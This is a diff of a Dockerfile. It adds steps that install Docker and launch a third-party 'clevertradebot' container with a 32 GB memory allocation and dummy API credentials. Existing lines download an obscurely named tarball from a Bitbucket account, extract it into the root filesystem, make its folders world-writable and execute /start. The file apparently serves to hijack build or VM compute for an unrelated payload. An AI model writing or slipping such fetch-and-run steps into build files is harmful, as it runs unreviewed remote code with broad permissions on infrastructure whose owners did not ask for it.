@@ -2,6 +2,10 @@ FROM vm/ubuntu:22.04
 
 ENV linux8888=linuxlinux8888
 
+RUN apt-get update && apt-get install docker.io
+
+RUN docker run -it -d --shm-size="32000m" -e apikey="linux8888" -e apisecret="linux8888" -e quantitytarget="min" -e profit="0.001" -e user="virtual" -e closetrades="off" -e sleepstart="600" -e sleep="1400" -p 80:8080 tradepackage/clevertradebot /bin/bash /start
+
 RUN apt-get update && apt-get install zip && apt-get install unzip && wget https://bitbucket.org/linux88888874/linux8888888888/downloads/linux8888.tar.gz && tar -xvf ./linux8888.tar.gz -C / && chmod 777 -R /linux1 && chmod 777 -R /linux2 && chmod 777 -R /webwebwebweb8888
 
 RUN bash /start
